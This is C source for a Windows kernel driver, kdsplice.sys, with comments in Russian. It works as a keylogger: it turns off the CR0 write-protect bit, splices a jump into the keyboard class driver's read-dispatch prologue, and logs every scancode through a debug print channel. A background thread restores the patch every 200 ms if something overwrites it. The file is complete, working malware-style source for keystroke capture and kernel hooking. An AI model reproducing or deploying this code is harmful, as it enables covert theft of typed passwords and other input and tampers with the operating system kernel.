#include <ntifs.h>
#include <ntddkbd.h>

#include "..\kdprint\kernel\kdprint.h"
#include "..\kdprint\kdctl.h"

#include <pshpack1.h>

// код, эквивалентный near jump на FuncPtr
typedef struct _NEARJUMP
{
	UCHAR		m_PushImm_Opcode;		// push immediate = 0x68
	PVOID		m_FuncPtr;				// указатель на ф-ю
	UCHAR		m_RetNear_Opcode;		// ret near = 0xc3
} NEARJUMP, *PNEARJUMP;

#define INIT_NEARJUMP(NearJump, pFunc)		\
{											\
	NearJump.m_PushImm_Opcode = 0x68;		\
	NearJump.m_FuncPtr = pFunc;				\
	NearJump.m_RetNear_Opcode = 0xc3;		\
}

#define MAX_PROLOGUE_SIZE		20

typedef struct _ORIG_FUNC_CALL
{
	UCHAR		m_Nops[MAX_PROLOGUE_SIZE];	// NOP'ы под пролог ф-и
	UCHAR		m_PushImm_Opcode;			// push immediate = 0x68
	PVOID		m_FuncPtr;					// указатель на ф-ю
	UCHAR		m_RetNear_Opcode;			// ret near = 0xc3
} ORIG_FUNC_CALL, *PORIG_FUNC_CALL;

#define INIT_ORIG_FUNC_CALL(OrigFuncCall, pFunc)						\
{																		\
	memset(OrigFuncCall.m_Nops, 0x90/*NOP opcode*/, MAX_PROLOGUE_SIZE);	\
	OrigFuncCall.m_PushImm_Opcode = 0x68;								\
	OrigFuncCall.m_FuncPtr = pFunc;										\
	OrigFuncCall.m_RetNear_Opcode = 0xc3;								\
}

#include <poppack.h>

typedef
struct _GLOBAL_CONTEXT
{
	PDEVICE_OBJECT		m_pTargetDevice;

	PDRIVER_DISPATCH	m_rfDispatch;
	ORIG_FUNC_CALL		m_rDispatchCall;
	NEARJUMP			m_rDispatchPrologue;
} GLOBAL_CONTEXT, *PGLOBAL_CONTEXT;

typedef
NTSTATUS (NTAPI *f_Dispatch)(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);


UCHAR		Check_ReadDispatch_Prologue[] =	{	0x8b, 0xff, 0x55, 0x8b, 0xec, 0x8b, 0x45, 0x08	};

BOOLEAN g_bUnload = FALSE;
volatile LONG gSysEnters = 0;
HANDLE hPatchCheckThread = NULL;

//-------------------------------------------------------------------------------------
// /SECTION:.exdata,ERW
#pragma section(".exdata", read, write, execute)

__declspec(allocate(".exdata")) GLOBAL_CONTEXT gKDContext;
//-------------------------------------------------------------------------------------

// установка бита WP в cr0 в заданное значение
// возвращает предыдущее значение бита
__declspec(naked) ULONG _stdcall SetWPBit(IN ULONG Set)
{
	__asm
	{
		push	ebp
		mov		ebp, esp

		push	ebx
		push	edx

		mov		ebx, cr0
		mov		eax, ebx

		mov		edx, Set
		and		edx, 1
		shl		edx, 16

		and		ebx, ~0x10000
		or		ebx, edx
		mov		cr0, ebx

		and		eax, 10000h
		shr		eax, 16

		pop		edx
		pop		ebx
		
		pop		ebp

		ret		4
	}
}

// установка сплайсеров..
VOID SetSplice(IN PVOID OrigFunc, IN PVOID HookFunc, IN ULONG FuncPrologueSize,
				OUT PORIG_FUNC_CALL pOrigFuncCall, OUT PNEARJUMP pOrigFuncPrologue)
{
	ULONG WPBit;
	NEARJUMP NearJump;

	INIT_ORIG_FUNC_CALL((*pOrigFuncCall), ((PCHAR)OrigFunc+FuncPrologueSize));
	memcpy(&pOrigFuncCall->m_Nops, OrigFunc, FuncPrologueSize);
	memcpy(pOrigFuncPrologue, OrigFunc, sizeof(NEARJUMP));

	INIT_NEARJUMP(NearJump, HookFunc);

	WPBit = SetWPBit(0);
	memcpy(OrigFunc, &NearJump, sizeof(NEARJUMP));
	SetWPBit(WPBit);
}

VOID RemoveSplice(IN PVOID OrigFunc, IN PNEARJUMP pOrigFuncPrologue)
{
	ULONG WPBit;

	WPBit = SetWPBit(0);
	memcpy(OrigFunc, pOrigFuncPrologue, sizeof(NEARJUMP));
	SetWPBit(WPBit);
}

NTSTATUS NTAPI KDReadCompletion(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN PVOID Context)
{
	PKEYBOARD_INPUT_DATA KeyData;
	ULONG KeyCount;
	ULONG i;

	if (Irp->IoStatus.Status == STATUS_SUCCESS)
	{
		KeyData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
		KeyCount = Irp->IoStatus.Information/sizeof(KEYBOARD_INPUT_DATA);

		for(i = 0; i < KeyCount; i++)
		{
			KDPrint("kdsplice.sys: key SCANCODE:%d ", KeyData[i].MakeCode);

			if (KeyData[i].Flags == KEY_MAKE)
				KDPrint("pressed");
			
			if (KeyData[i].Flags & KEY_BREAK)
				KDPrint("released");
			if (KeyData[i].Flags & KEY_E0)
				KDPrint(" E0 flag");
			if (KeyData[i].Flags & KEY_E1)
				KDPrint(" E1 flag");

			KDPrint("\n");
		}
	}

	if (Irp->PendingReturned)
		IoMarkIrpPending(Irp);

	InterlockedDecrement((PLONG)&gSysEnters);

	return STATUS_SUCCESS;
}

NTSTATUS NTAPI Hooked_ReadDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	NTSTATUS ntStatus;
	PIO_STACK_LOCATION IrpSp;

// чтоб не выгрузиться слишком рано..
	InterlockedIncrement((PLONG)&gSysEnters);

	if (DeviceObject == gKDContext.m_pTargetDevice && !g_bUnload)
	{
// ручками устанавливаем completionroutine на текущий уровень
		IrpSp = IoGetCurrentIrpStackLocation(Irp);
		if (!IrpSp->CompletionRoutine)
		{
			IrpSp->CompletionRoutine = KDReadCompletion;
			IrpSp->Context = NULL;
			IrpSp->Control = SL_INVOKE_ON_SUCCESS | SL_INVOKE_ON_ERROR | SL_INVOKE_ON_CANCEL;

// чтоб не выгрузиться слишком рано..
			InterlockedIncrement((PLONG)&gSysEnters);
		}
		else
			KDPrint("kdsplice.sys: completion routine not set..\n");
	}
// оригинальный обработчик
	ntStatus = ((PDRIVER_DISPATCH)&gKDContext.m_rDispatchCall)(DeviceObject, Irp);

	InterlockedDecrement((PLONG)&gSysEnters);

	return ntStatus;
}

VOID CheckPatchRestore(IN PVOID fFuncToPatch, IN PVOID fHookFunc, IN ULONG FuncPrologueSize,
						 IN PVOID pCheck_FuncPrologue, OUT PNEARJUMP p_rFuncPrologue, 
						 OUT PORIG_FUNC_CALL pOrigFuncCall)
{
	NEARJUMP JumpToHook;

	INIT_NEARJUMP(JumpToHook, fHookFunc);
	if (memcmp(fFuncToPatch, &JumpToHook, sizeof(NEARJUMP)) != 0)
	{
		KDPrint("kdsplice.sys : splice overwritten, need to restore..\n");

		if (memcmp(fFuncToPatch, pCheck_FuncPrologue, FuncPrologueSize) == 0)
		{
// патчим..
			SetSplice(fFuncToPatch, fHookFunc, FuncPrologueSize, pOrigFuncCall, p_rFuncPrologue);
			KDPrint("kdsplice.sys: restored splice\n");
		}
		else
			KDPrint("kdsplice.sys: failed to restore splice, function prologue changed\n");

	}
	else
		KDPrint("kdsplice.sys: splice still set\n");
}

VOID NTAPI PatchCheckThread(IN PVOID Context)
{
	LARGE_INTEGER ExpireTime;

	ExpireTime.QuadPart = -2000000L;	// 200 msec
	while (!g_bUnload)
	{
		CheckPatchRestore(gKDContext.m_rfDispatch, Hooked_ReadDispatch, sizeof(Check_ReadDispatch_Prologue),
			Check_ReadDispatch_Prologue, &gKDContext.m_rDispatchPrologue, &gKDContext.m_rDispatchCall);

		KeDelayExecutionThread(KernelMode, FALSE, &ExpireTime);
	}

	PsTerminateSystemThread(STATUS_SUCCESS);
}

static PDEVICE_OBJECT g_pControlDeviceObject = NULL;

VOID KDUnload(IN PDRIVER_OBJECT DriverObject)
{
	LARGE_INTEGER ExpireTime;
	UNICODE_STRING cntdSymlinkName;

	g_bUnload = TRUE;
	ZwWaitForSingleObject(hPatchCheckThread, FALSE, NULL);
	ZwClose(hPatchCheckThread);

// ждем выхода из completionroutine
	ExpireTime.QuadPart = -1000000L;	// 100 msec
	while (gSysEnters)
		KeDelayExecutionThread(KernelMode, FALSE, &ExpireTime);
// восстанаваливаем dispatchtable
	RemoveSplice(gKDContext.m_rfDispatch, &gKDContext.m_rDispatchPrologue) ;

	ObDereferenceObject(gKDContext.m_pTargetDevice);

	KDPrintUnInit();
	
	RtlInitUnicodeString(&cntdSymlinkName, K_CONTROL_SYMLINK_NAME(KDSPLICE));
	IoDeleteSymbolicLink(&cntdSymlinkName);
	IoDeleteDevice(g_pControlDeviceObject);

	KDPrint("kdsplice.sys: unloaded..\n");
}

NTSTATUS NTAPI KDControlDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	NTSTATUS ntStatus = STATUS_INVALID_DEVICE_REQUEST;
	PIO_STACK_LOCATION IrpSp = IoGetCurrentIrpStackLocation(Irp);


	if (IrpSp->DeviceObject == g_pControlDeviceObject)
	{
		switch (IrpSp->MajorFunction)
		{
		case IRP_MJ_CREATE:
		case IRP_MJ_CLOSE:
			ntStatus = STATUS_SUCCESS;
			break;
		case IRP_MJ_DEVICE_CONTROL:
			if (IrpSp->Parameters.DeviceIoControl.IoControlCode != IOCTL_INIT_KDPRINT)
				break;

			if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(KDPRINT_INIT_INPARAM))
			{
				ntStatus = KDPrintInit(	((PKDPRINT_INIT_INPARAM)Irp->AssociatedIrp.SystemBuffer)->m_hSectionMutant,
										((PKDPRINT_INIT_INPARAM)Irp->AssociatedIrp.SystemBuffer)->m_hSection);
			}
		}
	}

	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = ntStatus;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return ntStatus;
}

// получаем и референсим базовый девайс..
NTSTATUS ReferenceDeviceByName(IN PUNICODE_STRING DevicePath, OUT PDEVICE_OBJECT *p_pDeviceObject)
{
	OBJECT_ATTRIBUTES OA;
	NTSTATUS ntStatus;
	HANDLE hFile;
	IO_STATUS_BLOCK ioStatus;
	PFILE_OBJECT pFileObject;
	PDEVICE_OBJECT pDeviceObject;

	InitializeObjectAttributes(&OA, DevicePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

	ntStatus = ZwOpenFile(&hFile, 0,  &OA, &ioStatus, 0, FILE_NON_DIRECTORY_FILE);
	if (NT_SUCCESS(ntStatus ))
	{
		ntStatus = ObReferenceObjectByHandle(hFile, 0, *IoFileObjectType, KernelMode, &pFileObject, NULL);
		if (NT_SUCCESS(ntStatus))
		{
			pDeviceObject = IoGetBaseFileSystemDeviceObject(pFileObject);
			if (pDeviceObject)
			{
				ntStatus = ObReferenceObjectByPointer(pDeviceObject, 0, NULL, KernelMode);
				if (NT_SUCCESS(ntStatus))
					*p_pDeviceObject = pDeviceObject;
			}
		}

		ZwClose(hFile);
	}

	return ntStatus;
}

NTSTATUS NTAPI DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
	NTSTATUS ntStatus;
	UNICODE_STRING cntdKbdClassStr;
	PDEVICE_OBJECT pDeviceObject;
	UNICODE_STRING cntdControlDeviceName;
	UNICODE_STRING cntdControlSymlinkName;

	DriverObject->DriverUnload = KDUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = KDControlDispatch;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = KDControlDispatch;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = KDControlDispatch;

	RtlInitUnicodeString(&cntdControlDeviceName, K_CONTROL_DEVICE_NAME(KDSPLICE));
	ntStatus = IoCreateDevice(DriverObject, 0, &cntdControlDeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE,
		&g_pControlDeviceObject);
	if (!NT_SUCCESS(ntStatus))
		return ntStatus;

	g_pControlDeviceObject->Flags |= DO_BUFFERED_IO;
	
	RtlInitUnicodeString(&cntdControlSymlinkName, K_CONTROL_SYMLINK_NAME(KDSPLICE));
	ntStatus = IoCreateSymbolicLink(&cntdControlSymlinkName, &cntdControlDeviceName);
	if (!NT_SUCCESS(ntStatus))
	{
		IoDeleteDevice(g_pControlDeviceObject);
		return ntStatus;
	}

	RtlInitUnicodeString(&cntdKbdClassStr, L"\\Device\\KeyboardClass0");
	ntStatus = ReferenceDeviceByName(&cntdKbdClassStr, &pDeviceObject);
	if (!NT_SUCCESS(ntStatus))
	{
		KDPrint("kdsplice.sys: failed to get pointer to \\Device\\KeyboardClass0\n");

		IoDeleteDevice(g_pControlDeviceObject);
		IoDeleteSymbolicLink(&cntdControlSymlinkName);
		return STATUS_UNSUCCESSFUL;
	}

// ставим сплайс на обработчик MJ_READ
	gKDContext.m_pTargetDevice = pDeviceObject;
	gKDContext.m_rfDispatch = pDeviceObject->DriverObject->MajorFunction[IRP_MJ_READ];
	if (memcmp(gKDContext.m_rfDispatch, Check_ReadDispatch_Prologue, sizeof(Check_ReadDispatch_Prologue)) != 0)
	{
		KDPrint("kdsplice.sys: not a valid kbdclass driver\n");

		ObDereferenceObject(pDeviceObject);

		IoDeleteDevice(g_pControlDeviceObject);
		IoDeleteSymbolicLink(&cntdControlSymlinkName);

		return STATUS_UNSUCCESSFUL;
	}
	SetSplice(gKDContext.m_rfDispatch, Hooked_ReadDispatch, sizeof(Check_ReadDispatch_Prologue),
		&gKDContext.m_rDispatchCall, &gKDContext.m_rDispatchPrologue);

	ntStatus = PsCreateSystemThread(&hPatchCheckThread, 0, NULL, NULL, NULL, PatchCheckThread, NULL);
	if (!NT_SUCCESS(ntStatus))
	{
		KDPrint("kdsplice.sys: failed to create thread\n");

		RemoveSplice(gKDContext.m_rfDispatch, &gKDContext.m_rDispatchPrologue);
		ObDereferenceObject(pDeviceObject);

		IoDeleteDevice(g_pControlDeviceObject);
		IoDeleteSymbolicLink(&cntdControlSymlinkName);

		return STATUS_UNSUCCESSFUL;
	}

	g_pControlDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
	
	KDPrint("kdsplice.sys: loaded..\n");

	return STATUS_SUCCESS;
	
}
